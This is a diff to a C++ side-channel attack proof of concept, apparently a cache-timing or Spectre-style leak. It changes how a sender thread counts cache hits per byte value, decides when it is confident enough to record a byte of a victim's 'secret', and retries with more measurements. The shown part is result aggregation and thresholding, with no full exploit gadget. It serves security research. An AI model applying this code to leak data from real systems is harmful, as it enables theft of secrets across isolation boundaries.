@@ -485,7 +485,8 @@ void send_worker(uint16_t port = 7777) {
   assert(s.setRemote("127.0.0.1", port) == 0);
   std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;
 
-  size_t measurements = 128;
+  constexpr size_t MIN_MEASUREMENTS = 128;
+  size_t measurements = MIN_MEASUREMENTS;
   std::string secret(target_len, 0);
 
   // Initialize target x to send to victim:
@@ -537,10 +538,15 @@ void send_worker(uint16_t port = 7777) {
         std::cout << "training_x: "<< training_x << std::endl;
         auto hits_idx = sort_indexes(hit_ts.at(attempt));
         for (size_t idx : hits_idx) {
+#ifdef ACCURATE_LATENCIES
           const auto hit = latency_ts.at(attempt).at(idx);
+#endif
           if (!hit_ts.at(attempt).test(idx)) { break; }
-          std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << "): "
-                    << hit << " cycles." << std::endl;
+          std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << ")"
+#ifdef ACCURATE_LATENCIES
+                    << ": " << hit << " cycles."
+#endif
+                    << std::endl;
         }
 #endif
 
@@ -558,7 +564,7 @@ void send_worker(uint16_t port = 7777) {
 
 
     // Summarize measurements:
-    std::valarray<double> counts(256, 0);
+    std::valarray<uint64_t> counts(uint64_t(0), 256);
     for (size_t b = 0; b < counts.size(); b++) {
       // for each measurement, count all bits set:
       for (size_t t = 0; t < tries; t++) {
@@ -568,34 +574,48 @@ void send_worker(uint16_t port = 7777) {
       }
     }
     // Output results from attack:
+#ifdef DEBUG
     std::cout << "Results for target_x_offset: " << m.x << '\n';
+#endif
     auto counts_idx = sort_indexes(counts);
-//    size_t last = std::numeric_limits<size_t>::max();
     for (size_t idx : counts_idx) {
       const auto hits = counts[idx];
       if (hits == 0) { break; }
+#ifdef DEBUG
       std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << "): "
                 << hits << " hits." << std::endl;
-//      last = idx;
+#endif
     }
-//    if (last < 256) {
-//      secret.at(m.x - target_x_offset) = last;
-//    }
 
     // Dynamic confidence adjustment:
-    double sum = counts.sum();
-    double mean = sum / counts.size();
-    double sum_sq = (counts * counts).sum();
-    double variance = (sum_sq - (sum*sum)/counts.size()) / (counts.size() - 1);
-    double stdev = sqrt(variance);
+    auto sum = counts.sum();
+    auto min = counts.min();
+    auto max = counts.max();
 
-    bool confident = stdev > 2;
+    bool single_contender = (sum == max) && sum >= 4;  // picked threshold 4 out of a hat.
+    bool significant = (sum - max) < (sum/4) && sum >= 16;  // picked noise threshold 4x out of a hat.
+    bool confident = single_contender || significant;
     if (!confident) {
-      measurements *= 2; // double the number of measurements
+      // Retry, doubling the number of measurments:
+      measurements *= 2;
     }
     else {
-      secret.at(m.x - target_x_offset) = counts_idx.at(0);
+      // Pick the byte with the highest hits:
+      auto idx = counts_idx.at(0);
+      secret.at(m.x - target_x_offset) = idx;
+
+      // Output statistics:
+      float confidence = (float(max) / float(sum)) * 100;
+      float observability = (float(max) / measurements) * 100;
+      std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << "): "
+                << max << '/' << sum << " hits with confidence "
+                << confidence << "%.\n";
+      std::cout << "Observability: " << observability << "% over "
+                << measurements << " measurements." << std::endl;
+
+      // Reset measurements:
       tries = 0;
+      measurements = MIN_MEASUREMENTS;
       hit_ts.clear();
 #ifdef ACCURATE_LATENCIES
       latency_ts.clear();
